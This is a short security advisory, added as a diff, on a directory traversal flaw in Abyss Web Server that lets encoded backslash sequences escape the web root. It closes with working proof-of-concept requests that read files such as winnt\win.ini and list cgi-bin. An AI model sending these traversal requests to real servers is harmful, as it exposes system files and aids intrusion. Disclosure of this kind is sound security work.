@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/5547/info
+
+A directory traversal vulnerability has been reported for Abyss Web Server. The issue is related to the failure to properly process the backslash '\', encoded as '%5c', character, which may be used as a directory delimiter under these platforms. By using the URL encoded sequence '%2e%2e%5c', the web root may be escaped.
+
+Exploitation can result in arbitrary system files being sent to a remote attacker. This information may be of value in attempting further attacks against the vulnerable system.
+
+This issue is reported to have different effects in a different environments.
+
+http://host/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini
+"GET /\..\..\..\..\..\winnt\win.ini HTTP/1.0" (using a Telnet client)
+http://host/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt/
+http://host/%2f%2e%2e%2f
+http://host/%2f%2e%2e%2fcgi-bin/
